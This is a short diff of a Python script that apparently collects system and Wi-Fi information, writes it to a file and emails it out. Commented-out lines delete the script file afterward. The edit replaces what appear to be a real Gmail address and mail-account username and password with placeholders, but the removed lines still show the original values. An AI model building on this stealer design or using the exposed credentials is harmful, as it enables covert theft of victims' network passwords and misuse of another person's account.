@@ -102,9 +102,9 @@ def encrypt_information_file():
 
 def main():
     system_information = "Informations.txt"
-    sender = "alsowadia2022@gmail.com"
-    receiver = "alsowadia2022@gmail.com"
-    subject = "aydinnyunus has sent you a message"
+    sender = "example@gmail.com"
+    receiver = "example@gmail.com"
+    subject = "alsowadi has sent you a message"
 
     if os.name == "nt":
         wifi_data = extract_wifi_info_windows()
@@ -149,13 +149,8 @@ def main():
     #     print("Error deleting script file:", e)
 
 if __name__ == "__main__":
-    YOUR_USERNAME = "a665783e9b0db8"
-    YOUR_PASSWORD = "150219ec9b4493"
+    YOUR_USERNAME = "username"
+    YOUR_PASSWORD = "password"
     main()
 
-var = -27095
-print(var) 
 
-
-var = -35722
-print(var)
